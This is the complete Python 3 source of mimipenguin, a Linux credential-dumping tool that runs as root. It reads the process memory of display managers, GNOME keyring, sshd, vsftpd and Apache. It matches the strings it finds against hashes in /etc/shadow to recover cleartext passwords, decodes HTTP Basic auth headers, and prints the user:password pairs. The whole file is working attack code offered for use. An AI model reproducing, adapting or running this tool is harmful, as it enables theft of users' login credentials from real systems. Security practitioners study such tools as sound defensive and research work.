#!/usr/bin/env python3
#   -*- encoding: utf8 -*-
#   Rewrite of mimipenguin in Python 3.
#   Original idea from Hunter Gregal (@huntergregal).
#   Implementation by Yannick Méheut (github.com/the-useless-one)
#   Copyright © 2017, Yannick Méheut <yannick@meheut.org>

#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.

#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.

from __future__ import print_function

import os
import platform
import re
import base64
import binascii
import crypt
import string


def running_as_root():
    return os.geteuid() == 0


def get_linux_distribution():
    try:
        return platform.dist()[0].lower()
    except IndexError:
        return str()


def compute_hash(ctype, salt, password):
    return crypt.crypt(password, '{}{}'.format(ctype, salt))


def strings(s, min_length=4):
    strings_result = list()
    result = str()

    for c in s:
        try:
            c = chr(c)
        except TypeError:
            # In Python 2, c is already a chr
            pass
        if c in string.printable:
            result += c
        else:
            if len(result) >= min_length:
                strings_result.append(result)
            result = str()

    return strings_result


def dump_process(pid):
    dump_result = bytes()

    with open('/proc/{}/maps'.format(pid), 'r') as maps_file:
        for l in maps_file.readlines():
            memrange, attributes = l.split(' ')[:2]
            if attributes.startswith('r'):
                memrange_start, memrange_stop = [
                    int(x, 16) for x in memrange.split('-')]
                memrange_size = memrange_stop - memrange_start
                with open('/proc/{}/mem'.format(pid), 'rb') as mem_file:
                    try:
                        mem_file.seek(memrange_start)
                        dump_result += mem_file.read(memrange_size)
                    except (OSError, ValueError, IOError, OverflowError):
                        pass

    return dump_result


def find_pid(process_name):
    pids = list()

    for pid in os.listdir('/proc'):
        try:
            with open('/proc/{}/cmdline'.format(pid), 'rb') as cmdline_file:
                if process_name in cmdline_file.read().decode():
                    pids.append(pid)
        except IOError:
            continue

    return pids


class PasswordFinder:
    _hash_re = r'^\$.\$.+$'

    def __init__(self):
        self._potential_passwords = list()
        self._strings_dump = list()
        self._found_hashes = list()

    def _dump_target_processes(self):
        target_pids = list()
        for target_process in self._target_processes:
            target_pids += find_pid(target_process)
        for target_pid in target_pids:
            self._strings_dump += strings(dump_process(target_pid))

    def _find_hash(self):
        for s in self._strings_dump:
            if re.match(PasswordFinder._hash_re, s):
                self._found_hashes.append(s)

    def _find_potential_passwords(self):
        for needle in self._needles:
            needle_indexes = [i for i, s in enumerate(self._strings_dump)
                              if re.search(needle, s)]
            for needle_index in needle_indexes:
                self._potential_passwords += self._strings_dump[
                    needle_index - 10:needle_index + 10]
        self._potential_passwords = list(set(self._potential_passwords))

    def _try_potential_passwords(self):
        valid_passwords = list()
        found_hashes = list()
        pw_hash_to_user = dict()

        if self._found_hashes:
            found_hashes = self._found_hashes
        with open('/etc/shadow', 'r') as f:
            for l in f.readlines():
                user, pw_hash = l.split(':')[:2]
                if not re.match(PasswordFinder._hash_re, pw_hash):
                    continue
                found_hashes.append(pw_hash)
                pw_hash_to_user[pw_hash] = user

        found_hashes = list(set(found_hashes))

        for found_hash in found_hashes:
            ctype = found_hash[:3]
            salt = found_hash.split('$')[2]
            for potential_password in self._potential_passwords:
                potential_hash = compute_hash(ctype, salt, potential_password)
                if potential_hash == found_hash:
                    try:
                        valid_passwords.append(
                            (pw_hash_to_user[found_hash], potential_password))
                    except KeyError:
                        valid_passwords.append(
                            ('<unknown user>', potential_password))

        return valid_passwords

    def dump_passwords(self):
        self._dump_target_processes()
        self._find_hash()
        self._find_potential_passwords()

        return self._try_potential_passwords()


class GdmPasswordFinder(PasswordFinder):
    def __init__(self):
        PasswordFinder.__init__(self)
        self._source_name = '[SYSTEM - GNOME]'
        self._target_processes = ['gdm-password']
        self._needles = ['^_pammodutil_getpwnam_root_1$',
                         '^gkr_system_authtok$']


class GnomeKeyringPasswordFinder(PasswordFinder):
    def __init__(self):
        PasswordFinder.__init__(self)
        self._source_name = '[SYSTEM - GNOME]'
        self._target_processes = ['gnome-keyring-daemon']
        self._needles = [r'^.+libgck\-1\.so\.0$', r'libgcrypt\.so\..+$', r'linux-vdso\.so\.1$']

class LightDmPasswordFinder(PasswordFinder):
    def __init__(self):
        PasswordFinder.__init__(self)
        self._source_name = '[SYSTEM - LIGHTDM]'
        self._target_processes = ['lightdm']
        self._needles = [r'^_pammodutil_getspnam_']

class VsftpdPasswordFinder(PasswordFinder):
    def __init__(self):
        PasswordFinder.__init__(self)
        self._source_name = '[SYSTEM - VSFTPD]'
        self._target_processes = ['vsftpd']
        self._needles = [
            r'^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$']


class SshdPasswordFinder(PasswordFinder):
    def __init__(self):
        PasswordFinder.__init__(self)
        self._source_name = '[SYSTEM - SSH]'
        self._target_processes = ['sshd:']
        self._needles = [r'^sudo.+']


class ApachePasswordFinder(PasswordFinder):
    def __init__(self):
        PasswordFinder.__init__(self)
        self._source_name = '[HTTP BASIC - APACHE2]'
        self._target_processes = ['apache2']
        self._needles = [r'^Authorization: Basic.+']

    def _try_potential_passwords(self):
        valid_passwords = list()

        for potential_password in self._potential_passwords:
            try:
                potential_password = base64.b64decode(potential_password)
            except binascii.Error:
                continue
            else:
                try:
                    user, password = potential_password.split(':', maxsplit=1)
                    valid_passwords.append((user, password))
                except IndexError:
                    continue

        return valid_passwords

    def dump_passwords(self):
        self._dump_target_processes()
        self._find_potential_passwords()

        return self._try_potential_passwords()


def main():
    if not running_as_root():
        raise RuntimeError('mimipenguin should be ran as root')

    password_finders = list()

    if find_pid('gdm-password'):
        password_finders.append(GdmPasswordFinder())
    if find_pid('gnome-keyring-daemon'):
        password_finders.append(GnomeKeyringPasswordFinder())
    if find_pid('lightdm'):
        password_finders.append(LightDmPasswordFinder())
    if os.path.isfile('/etc/vsftpd.conf'):
        password_finders.append(VsftpdPasswordFinder())
    if os.path.isfile('/etc/ssh/sshd_config'):
        password_finders.append(SshdPasswordFinder())
    if os.path.isfile('/etc/apache2/apache2.conf'):
        password_finders.append(ApachePasswordFinder())

    for password_finder in password_finders:
        for valid_passwords in password_finder.dump_passwords():
            print('{}\t{}:{}'.format(password_finder._source_name,
                                     valid_passwords[0], valid_passwords[1]))


if __name__ == '__main__':
    main()